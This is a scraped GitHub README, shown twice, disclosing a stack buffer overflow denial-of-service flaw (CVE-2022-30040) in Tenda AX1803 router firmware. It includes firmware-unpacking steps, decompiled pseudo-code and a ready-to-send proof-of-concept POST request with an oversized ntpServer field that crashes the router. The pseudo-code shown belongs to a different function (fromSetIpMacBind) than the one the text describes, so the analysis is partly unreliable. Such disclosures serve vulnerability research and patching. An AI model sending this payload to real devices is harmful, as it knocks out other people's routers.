=== Content from github.com_4352d97e_20250108_113814.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FLe1a%2FCVE-2022-30040)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FLe1a%2FCVE-2022-30040)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=Le1a%2FCVE-2022-30040)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Le1a](/Le1a)
/
**[CVE-2022-30040](/Le1a/CVE-2022-30040)**
Public

* [Notifications](/login?return_to=%2FLe1a%2FCVE-2022-30040) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2FLe1a%2FCVE-2022-30040)
* [Star
   0](/login?return_to=%2FLe1a%2FCVE-2022-30040)

[0
stars](/Le1a/CVE-2022-30040/stargazers) [0
forks](/Le1a/CVE-2022-30040/forks) [Branches](/Le1a/CVE-2022-30040/branches) [Tags](/Le1a/CVE-2022-30040/tags) [Activity](/Le1a/CVE-2022-30040/activity)
 [Star](/login?return_to=%2FLe1a%2FCVE-2022-30040)

 [Notifications](/login?return_to=%2FLe1a%2FCVE-2022-30040) You must be signed in to change notification settings

* [Code](/Le1a/CVE-2022-30040)
* [Issues
  0](/Le1a/CVE-2022-30040/issues)
* [Pull requests
  0](/Le1a/CVE-2022-30040/pulls)
* [Actions](/Le1a/CVE-2022-30040/actions)
* [Projects
  0](/Le1a/CVE-2022-30040/projects)
* [Security](/Le1a/CVE-2022-30040/security)
* [Insights](/Le1a/CVE-2022-30040/pulse)

Additional navigation options

* [Code](/Le1a/CVE-2022-30040)
* [Issues](/Le1a/CVE-2022-30040/issues)
* [Pull requests](/Le1a/CVE-2022-30040/pulls)
* [Actions](/Le1a/CVE-2022-30040/actions)
* [Projects](/Le1a/CVE-2022-30040/projects)
* [Security](/Le1a/CVE-2022-30040/security)
* [Insights](/Le1a/CVE-2022-30040/pulse)

# Le1a/CVE-2022-30040

    main[Branches](/Le1a/CVE-2022-30040/branches)[Tags](/Le1a/CVE-2022-30040/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[1 Commit](/Le1a/CVE-2022-30040/commits/main/) | | |
| [README.md](/Le1a/CVE-2022-30040/blob/main/README.md "README.md") | | [README.md](/Le1a/CVE-2022-30040/blob/main/README.md "README.md") |  |  |
| View all files | | |

## Repository files navigation

* README
# Tenda AX1803 v1.0.0.1\_2890 Denial-of-service Vulnerability

## Overview

* Manufacturer's website infomation: <https://www.tenda.com.cn/profile/contact.html>
* Firmware download address: <https://www.tenda.com.cn/download/default.html>

## Vulnerability description

The vulnerability lies in rootfs\_ In / goform / setsystimecfg of / bin / tdhttpd in ubif file system, attackers can access <http://ip/goform/SetSysTimeCfg> And by setting the ntpserve parameter, the stack buffer overflow can be caused to achieve the effect of router denial of service.

## Vulnerability details

**First unpack the firmware:**

Download the firmware from the manufacturer's official website（ <https://www.tenda.com.cn/download/detail-3225.html> ）Since the firmware is not encrypted, the Tenda ax1803 v1.0 is encrypted directly through the binwalk tool (command: binwalk - me \*. Bin) 0.0.1\_ Unpack the 2890 firmware to get rootfs\_ UBIFS file system.

**Vulnerability analysis:**

(Note: the following code screenshot is the pseudo-C language code obtained by disassembling and decompiling the / bin / tdhttpd file in rootfs\_ubifs through ida7.6\_pro\_32-bit)

When accessing / goform / setsystimecfg, the user will enter the fromsetsystime function for processing. The following are some pseudo code screenshots and comments of the fromsetsystime function:

[![image](https://user-images.githubusercontent.com/97610822/165426822-f2ea66c7-6cee-4d9d-aa61-6af243831158.png)](https://user-images.githubusercontent.com/97610822/165426822-f2ea66c7-6cee-4d9d-aa61-6af243831158.png)

[![image](https://user-images.githubusercontent.com/97610822/165426845-26ab90e6-fa5c-49db-af83-5667d0743fc6.png)](https://user-images.githubusercontent.com/97610822/165426845-26ab90e6-fa5c-49db-af83-5667d0743fc6.png)

[![image](https://user-images.githubusercontent.com/97610822/165426892-4cb36877-5ad7-4251-aa46-d9ca0efb5d1b.png)](https://user-images.githubusercontent.com/97610822/165426892-4cb36877-5ad7-4251-aa46-d9ca0efb5d1b.png)

When users access <http://ip/goform/SetSysTimeCfg> Time rootfs\_ ubifs / bin / tdhttpd in will call fromsetsystime to handle this access, and will assign the ntpserver parameter submitted by the post method to the V4 pointer, and then enter an inevitable if branch (analysis has been written in the comments in the pseudo code screenshot). There is a vulnerability code in this if branch: strcpy (& V32 [16], B4). Therefore, you can override the return address of the function as invalid address by setting the ntpserver parameter submitted by V4, that is, post to overflow the boundary of V32, so as to restart the router and cause the effect of denial of service attack

Pseudo code of fromsetsystime function attached:

```
int __fastcall fromSetIpMacBind(int a1)
{
const char *Parameter; // r5
unsigned int v2; // r0
int i; // r4
char *v4; // r0
char *v5; // r11
int v6; // r3
int v7; // r5
int v8; // r2
int v10; // [sp+8h] [bp-440h]
char *nptr; // [sp+10h] [bp-438h]
int v13; // [sp+14h] [bp-434h]
char v14[32]; // [sp+28h] [bp-420h] BYREF
char v15[32]; // [sp+48h] [bp-400h] BYREF
char v16[64]; // [sp+68h] [bp-3E0h] BYREF
char v17[64]; // [sp+A8h] [bp-3A0h] BYREF
char dest[64]; // [sp+E8h] [bp-360h] BYREF
char v19[128]; // [sp+128h] [bp-320h] BYREF
char v20[128]; // [sp+1A8h] [bp-2A0h] BYREF 可以通过设置list参数通过strcpy函数溢出的
栈上变量
char s[256]; // [sp+228h] [bp-220h] BYREF
char v22[288]; // [sp+328h] [bp-120h] BYREF
memset(s, 0, sizeof(s));
memset(v16, 0, sizeof(v16));
memset(v19, 0, sizeof(v19));
nptr = GetParameter(a1, "bindnum", "0");
Parameter = GetParameter(a1, "list", &byte_1E9CC8);// 将访问
ip/goform/SetIpMacBind时post提交的list参数
// 赋值给Parameter变量
GetValue("dhcps.Staticnum", v19);
v13 = atoi(v19);
v2 = atoi(nptr);
v10 = v2;
if ( v2 > 0x20 )
{
printf("staic ip number over %d\n", 32);
goto LABEL_30;
}
for ( i = 1; ; ++i )
{
v6 = Parameter;
if ( Parameter )
v6 = 1;
if ( i > v10 )
v6 = 0;
if ( !v6 )
break;
memset(v20, 0, sizeof(v20));
memset(v17, 0, sizeof(v17));
memset(v22, 0, 0x80u);
memset(v14, 0, sizeof(v14));
memset(v15, 0, sizeof(v15));
memset(dest, 0, sizeof(dest));
v4 = strchr(Parameter, '\n'); // 如果parameter也就是post提交的
list参数中存在换行符，则v4不为零，否则v4为零。
v5 = v4;
if ( v4 ) // v4不为零，也就是提交的list参数中存
在换行符
{
*v4 = 0;
strcpy(v20, Parameter); // 该处strcpy未检验v20边界，故可以通
过Parameter参数来溢出v20的边界以覆盖该函数的返回值，造成设备重启并且达到拒绝服务攻击。
Parameter = v5 + 1;
}
else // v4为零，也就是提交的list参数中无换
行符
{
strcpy(v20, Parameter); // 该处strcpy未检验v20边界，故可以通
过Parameter参数来溢出v20的边界以覆盖该函数的返回值，造成设备重启并且达到拒绝服务攻击。
}
if ( v20[0] == 13 )
{
if ( _isoc99_sscanf(&v20[1], "%17[0-9a-fA-F:]\r%s", v14) != 2 )
goto LABEL_20;
strcpy(dest, &byte_1E9CC8);
}
else if ( _isoc99_sscanf(v20, "%[^\r]\r%[0-9a-fA-F:]\r%s", dest) != 3 )
{
LABEL_20:
v2 = puts("get ip and mac error!");
v6 = 1;
break;
}
printf("%s %d# dev_name=%s,mac_addr=%s,ip_addr=%s\n", "set_mac_bind_list",
543, dest, v14, v15);
sprintf(v17, "dhcps.Staticip%d", i);
sprintf(v22, "%s;%s;0", v15, v14);
v2 = SetValue(v17, v22);
if ( dest[0] )
{
memset(v17, 0, sizeof(v17));
memset(v22, 0, 0x80u);
v2 = sub_62C98(dest, v14);
}
}
v7 = v10 + 1;
if ( i == v10 + 1 )
{
if ( !v6 )
{
puts("set static num sucess!");
v2 = SetValue("dhcps.Staticnum", nptr);
while ( v7 <= v13 )
{
memset(v19, 0, sizeof(v19));
sprintf(v16, "dhcps.Staticip%d", v7);
GetValue(v16, v19);
sprintf(v16, "dhcps.Staticip%d", v7++);
v2 = SetValue(v16, &byte_1E9CC8);
}
goto LABEL_27;
}
LABEL_30:
v8 = 1;
goto LABEL_31;
}
if ( v6 )
goto LABEL_30;
LABEL_27:
if ( sub_8CB38(v2) )
{
memset(v22, 0, 0x100u);
strcpy(v22, "op=200");
send_msg_to_netctrl(19, v22);
}
v8 = 0;
LABEL_31:
sprintf(s, "{\"errCode\":%d}", v8);
return sub_55970(a1, s);
}

```

## POC

```
POST /goform/SetSysTimeCfg HTTP/1.1
Host: 192.168.10.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: password=bb507bf3973a97a9bf1267699f712550bkcmji
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
ntpServer=a*num

```

(Note: num needs to be greater than 0x134h bytes, that is, if the number of characters to be sent is greater than 0x134h, DoS attack can be caused)

## About

No description, website, or topics provided.
### Resources

[Readme](#readme-ov-file)

[Activity](/Le1a/CVE-2022-30040/activity)
### Stars

[**0**
stars](/Le1a/CVE-2022-30040/stargazers)
### Watchers

[**1**
watching](/Le1a/CVE-2022-30040/watchers)
### Forks

[**0**
forks](/Le1a/CVE-2022-30040/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FLe1a%2FCVE-2022-30040&report=Le1a+%28user%29)

## [Releases](/Le1a/CVE-2022-30040/releases)

No releases published

## [Packages 0](/users/Le1a/packages?repo_name=CVE-2022-30040)

No packages published

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_f831dfb3_20250108_113814.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FLe1a%2FCVE-2022-30040)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FLe1a%2FCVE-2022-30040)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=Le1a%2FCVE-2022-30040)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Le1a](/Le1a)
/
**[CVE-2022-30040](/Le1a/CVE-2022-30040)**
Public

* [Notifications](/login?return_to=%2FLe1a%2FCVE-2022-30040) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2FLe1a%2FCVE-2022-30040)
* [Star
   0](/login?return_to=%2FLe1a%2FCVE-2022-30040)

[0
stars](/Le1a/CVE-2022-30040/stargazers) [0
forks](/Le1a/CVE-2022-30040/forks) [Branches](/Le1a/CVE-2022-30040/branches) [Tags](/Le1a/CVE-2022-30040/tags) [Activity](/Le1a/CVE-2022-30040/activity)
 [Star](/login?return_to=%2FLe1a%2FCVE-2022-30040)

 [Notifications](/login?return_to=%2FLe1a%2FCVE-2022-30040) You must be signed in to change notification settings

* [Code](/Le1a/CVE-2022-30040)
* [Issues
  0](/Le1a/CVE-2022-30040/issues)
* [Pull requests
  0](/Le1a/CVE-2022-30040/pulls)
* [Actions](/Le1a/CVE-2022-30040/actions)
* [Projects
  0](/Le1a/CVE-2022-30040/projects)
* [Security](/Le1a/CVE-2022-30040/security)
* [Insights](/Le1a/CVE-2022-30040/pulse)

Additional navigation options

* [Code](/Le1a/CVE-2022-30040)
* [Issues](/Le1a/CVE-2022-30040/issues)
* [Pull requests](/Le1a/CVE-2022-30040/pulls)
* [Actions](/Le1a/CVE-2022-30040/actions)
* [Projects](/Le1a/CVE-2022-30040/projects)
* [Security](/Le1a/CVE-2022-30040/security)
* [Insights](/Le1a/CVE-2022-30040/pulse)

# Le1a/CVE-2022-30040

    main[Branches](/Le1a/CVE-2022-30040/branches)[Tags](/Le1a/CVE-2022-30040/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[1 Commit](/Le1a/CVE-2022-30040/commits/main/) | | |
| [README.md](/Le1a/CVE-2022-30040/blob/main/README.md "README.md") | | [README.md](/Le1a/CVE-2022-30040/blob/main/README.md "README.md") |  |  |
| View all files | | |

## Repository files navigation

* README
# Tenda AX1803 v1.0.0.1\_2890 Denial-of-service Vulnerability

## Overview

* Manufacturer's website infomation: <https://www.tenda.com.cn/profile/contact.html>
* Firmware download address: <https://www.tenda.com.cn/download/default.html>

## Vulnerability description

The vulnerability lies in rootfs\_ In / goform / setsystimecfg of / bin / tdhttpd in ubif file system, attackers can access <http://ip/goform/SetSysTimeCfg> And by setting the ntpserve parameter, the stack buffer overflow can be caused to achieve the effect of router denial of service.

## Vulnerability details

**First unpack the firmware:**

Download the firmware from the manufacturer's official website（ <https://www.tenda.com.cn/download/detail-3225.html> ）Since the firmware is not encrypted, the Tenda ax1803 v1.0 is encrypted directly through the binwalk tool (command: binwalk - me \*. Bin) 0.0.1\_ Unpack the 2890 firmware to get rootfs\_ UBIFS file system.

**Vulnerability analysis:**

(Note: the following code screenshot is the pseudo-C language code obtained by disassembling and decompiling the / bin / tdhttpd file in rootfs\_ubifs through ida7.6\_pro\_32-bit)

When accessing / goform / setsystimecfg, the user will enter the fromsetsystime function for processing. The following are some pseudo code screenshots and comments of the fromsetsystime function:

[![image](https://user-images.githubusercontent.com/97610822/165426822-f2ea66c7-6cee-4d9d-aa61-6af243831158.png)](https://user-images.githubusercontent.com/97610822/165426822-f2ea66c7-6cee-4d9d-aa61-6af243831158.png)

[![image](https://user-images.githubusercontent.com/97610822/165426845-26ab90e6-fa5c-49db-af83-5667d0743fc6.png)](https://user-images.githubusercontent.com/97610822/165426845-26ab90e6-fa5c-49db-af83-5667d0743fc6.png)

[![image](https://user-images.githubusercontent.com/97610822/165426892-4cb36877-5ad7-4251-aa46-d9ca0efb5d1b.png)](https://user-images.githubusercontent.com/97610822/165426892-4cb36877-5ad7-4251-aa46-d9ca0efb5d1b.png)

When users access <http://ip/goform/SetSysTimeCfg> Time rootfs\_ ubifs / bin / tdhttpd in will call fromsetsystime to handle this access, and will assign the ntpserver parameter submitted by the post method to the V4 pointer, and then enter an inevitable if branch (analysis has been written in the comments in the pseudo code screenshot). There is a vulnerability code in this if branch: strcpy (& V32 [16], B4). Therefore, you can override the return address of the function as invalid address by setting the ntpserver parameter submitted by V4, that is, post to overflow the boundary of V32, so as to restart the router and cause the effect of denial of service attack

Pseudo code of fromsetsystime function attached:

```
int __fastcall fromSetIpMacBind(int a1)
{
const char *Parameter; // r5
unsigned int v2; // r0
int i; // r4
char *v4; // r0
char *v5; // r11
int v6; // r3
int v7; // r5
int v8; // r2
int v10; // [sp+8h] [bp-440h]
char *nptr; // [sp+10h] [bp-438h]
int v13; // [sp+14h] [bp-434h]
char v14[32]; // [sp+28h] [bp-420h] BYREF
char v15[32]; // [sp+48h] [bp-400h] BYREF
char v16[64]; // [sp+68h] [bp-3E0h] BYREF
char v17[64]; // [sp+A8h] [bp-3A0h] BYREF
char dest[64]; // [sp+E8h] [bp-360h] BYREF
char v19[128]; // [sp+128h] [bp-320h] BYREF
char v20[128]; // [sp+1A8h] [bp-2A0h] BYREF 可以通过设置list参数通过strcpy函数溢出的
栈上变量
char s[256]; // [sp+228h] [bp-220h] BYREF
char v22[288]; // [sp+328h] [bp-120h] BYREF
memset(s, 0, sizeof(s));
memset(v16, 0, sizeof(v16));
memset(v19, 0, sizeof(v19));
nptr = GetParameter(a1, "bindnum", "0");
Parameter = GetParameter(a1, "list", &byte_1E9CC8);// 将访问
ip/goform/SetIpMacBind时post提交的list参数
// 赋值给Parameter变量
GetValue("dhcps.Staticnum", v19);
v13 = atoi(v19);
v2 = atoi(nptr);
v10 = v2;
if ( v2 > 0x20 )
{
printf("staic ip number over %d\n", 32);
goto LABEL_30;
}
for ( i = 1; ; ++i )
{
v6 = Parameter;
if ( Parameter )
v6 = 1;
if ( i > v10 )
v6 = 0;
if ( !v6 )
break;
memset(v20, 0, sizeof(v20));
memset(v17, 0, sizeof(v17));
memset(v22, 0, 0x80u);
memset(v14, 0, sizeof(v14));
memset(v15, 0, sizeof(v15));
memset(dest, 0, sizeof(dest));
v4 = strchr(Parameter, '\n'); // 如果parameter也就是post提交的
list参数中存在换行符，则v4不为零，否则v4为零。
v5 = v4;
if ( v4 ) // v4不为零，也就是提交的list参数中存
在换行符
{
*v4 = 0;
strcpy(v20, Parameter); // 该处strcpy未检验v20边界，故可以通
过Parameter参数来溢出v20的边界以覆盖该函数的返回值，造成设备重启并且达到拒绝服务攻击。
Parameter = v5 + 1;
}
else // v4为零，也就是提交的list参数中无换
行符
{
strcpy(v20, Parameter); // 该处strcpy未检验v20边界，故可以通
过Parameter参数来溢出v20的边界以覆盖该函数的返回值，造成设备重启并且达到拒绝服务攻击。
}
if ( v20[0] == 13 )
{
if ( _isoc99_sscanf(&v20[1], "%17[0-9a-fA-F:]\r%s", v14) != 2 )
goto LABEL_20;
strcpy(dest, &byte_1E9CC8);
}
else if ( _isoc99_sscanf(v20, "%[^\r]\r%[0-9a-fA-F:]\r%s", dest) != 3 )
{
LABEL_20:
v2 = puts("get ip and mac error!");
v6 = 1;
break;
}
printf("%s %d# dev_name=%s,mac_addr=%s,ip_addr=%s\n", "set_mac_bind_list",
543, dest, v14, v15);
sprintf(v17, "dhcps.Staticip%d", i);
sprintf(v22, "%s;%s;0", v15, v14);
v2 = SetValue(v17, v22);
if ( dest[0] )
{
memset(v17, 0, sizeof(v17));
memset(v22, 0, 0x80u);
v2 = sub_62C98(dest, v14);
}
}
v7 = v10 + 1;
if ( i == v10 + 1 )
{
if ( !v6 )
{
puts("set static num sucess!");
v2 = SetValue("dhcps.Staticnum", nptr);
while ( v7 <= v13 )
{
memset(v19, 0, sizeof(v19));
sprintf(v16, "dhcps.Staticip%d", v7);
GetValue(v16, v19);
sprintf(v16, "dhcps.Staticip%d", v7++);
v2 = SetValue(v16, &byte_1E9CC8);
}
goto LABEL_27;
}
LABEL_30:
v8 = 1;
goto LABEL_31;
}
if ( v6 )
goto LABEL_30;
LABEL_27:
if ( sub_8CB38(v2) )
{
memset(v22, 0, 0x100u);
strcpy(v22, "op=200");
send_msg_to_netctrl(19, v22);
}
v8 = 0;
LABEL_31:
sprintf(s, "{\"errCode\":%d}", v8);
return sub_55970(a1, s);
}

```

## POC

```
POST /goform/SetSysTimeCfg HTTP/1.1
Host: 192.168.10.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: password=bb507bf3973a97a9bf1267699f712550bkcmji
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
ntpServer=a*num

```

(Note: num needs to be greater than 0x134h bytes, that is, if the number of characters to be sent is greater than 0x134h, DoS attack can be caused)

## About

No description, website, or topics provided.
### Resources

[Readme](#readme-ov-file)

[Activity](/Le1a/CVE-2022-30040/activity)
### Stars

[**0**
stars](/Le1a/CVE-2022-30040/stargazers)
### Watchers

[**1**
watching](/Le1a/CVE-2022-30040/watchers)
### Forks

[**0**
forks](/Le1a/CVE-2022-30040/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FLe1a%2FCVE-2022-30040&report=Le1a+%28user%29)

## [Releases](/Le1a/CVE-2022-30040/releases)

No releases published

## [Packages 0](/users/Le1a/packages?repo_name=CVE-2022-30040)

No packages published

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


